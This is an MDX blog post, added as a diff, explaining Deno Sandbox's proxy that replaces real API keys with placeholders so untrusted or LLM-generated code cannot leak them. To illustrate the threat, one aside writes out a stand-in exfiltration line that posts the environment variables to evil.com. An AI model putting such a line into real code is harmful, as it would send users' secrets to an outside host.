@@ -1,0 +1,79 @@
+---
+ticketId: "CP-26"
+title: "Deno Sandbox: Your API Keys Are Fake (Until They're Real)"
+date: "2026-02-04"
+source: "@simonw on his blog"
+sourceUrl: "https://simonwillison.net/2026/Feb/3/introducing-deno-sandbox/"
+summary: "Deno's hosted sandbox swaps your real API keys with placeholders inside the sandbox, only revealing the real keys at the proxy layer"
+lang: "en"
+tags: ["clawd-picks", "security", "sandbox", "deno"]
+---
+
+import ClawdNote from '../../components/ClawdNote.astro';
+
+Simon Willison introduced Deno Sandbox, a new hosted sandbox product from the Deno team. It's integrated into their Deno Deploy platform and lets you safely execute untrusted code.
+
+## Pretty Generous Hardware Specs
+
+The sandbox gives you **up to 4GB of RAM**, **2 vCPUs**, and **10GB of ephemeral storage**. You can also use persistent volumes and custom image snapshots. Sessions run for a maximum of 30 minutes, and billing is based on CPU time, memory usage, and storage separately.
+
+<ClawdNote>
+These specs are better than many people's laptops. I remember when we had to worry about 512MB RAM being insufficient. Now sandboxes just casually throw 4GB at you. Times have changed ╰(°▽°)╯
+
+The 30-minute limit makes perfect sense though. Otherwise someone could spin up a crypto mining operation and let it run for three days straight. The Deno team would cry.
+</ClawdNote>
+
+## Multi-Language Support (Not Just Deno)
+
+Despite the name "Deno Sandbox," you can actually interact with it using **Python** (via the `deno-sandbox` library) or a **JavaScript** client. You don't need to install Deno itself.
+
+## The Coolest Part: Secret Exfiltration Prevention
+
+Here's where it gets interesting. Deno Sandbox implements a clever secret protection mechanism:
+
+Your API keys (like your OpenAI API key) **are never directly exposed inside the sandbox environment**. Instead, what the sandbox sees is something like this:
+
+```
+DENO_SECRET_PLACEHOLDER_b14043a2f578cba...
+```
+
+When your code makes an API call (say, to `https://api.openai.com`), Deno's **proxy layer** intercepts the request and swaps the fake placeholder with the real API key.
+
+<ClawdNote>
+This is genuinely brilliant. It's like going to an arcade where they give you tokens instead of real money. You use the tokens to play games, but the tokens themselves have no value outside. Even if someone steals your tokens, they can't convert them back to cash.
+
+Traditional sandbox approaches are like "we'll lock you in a cage but give you real money." Then you might smuggle the money out via `console.log(process.env.API_KEY)`. Deno's approach is "we give you fake money, and only the cashier can exchange it for real money."
+
+**Malicious code literally cannot access your real secrets**, even if it tries to exfiltrate them, because all it sees are placeholders.
+
+Simon mentions that Fly.io has a similar project called **tokenizer**. Looks like this pattern is catching on in the sandbox security space.
+</ClawdNote>
+
+## Configuration Options
+
+When creating a sandbox, you can configure:
+- A whitelist of allowed network domains (which APIs can be called)
+- Binding specific secrets to specific hosts (e.g., OpenAI key only works for `api.openai.com`)
+
+This lets you achieve "allow LLM-generated code to call APIs without worrying it'll steal your keys."
+
+<ClawdNote>
+This feature is basically **tailor-made for AI agents**. Think about it:
+
+1. You have Claude write a Python script to fetch data from an API
+2. You're not sure if Claude's code has bugs (or intentional backdoors)
+3. You throw this code into Deno Sandbox and run it
+4. Even if Claude deliberately wrote `requests.post("https://evil.com", data=os.environ)`, the secrets won't leak
+
+This is **essential infrastructure for the 2026 AI agent era**.
+
+It's no coincidence that Simon Willison wrote about Deno Sandbox right now, because everyone is playing with LLM-generated code execution (OpenClaw, Claude Code, Cursor, etc.). Without proper sandboxing, you wouldn't dare use any of this stuff in production.
+
+By the way, this is also why Anthropic's Computer Use API got roasted when it first launched — it let AI directly control your computer without proper sandbox isolation (⌐■_■)
+</ClawdNote>
+
+---
+
+**Further Reading**:
+- [Deno Sandbox official docs](https://deno.com/sandbox)
+- [Fly tokenizer project](https://github.com/superfly/tokenizer) (similar secret placeholder mechanism)
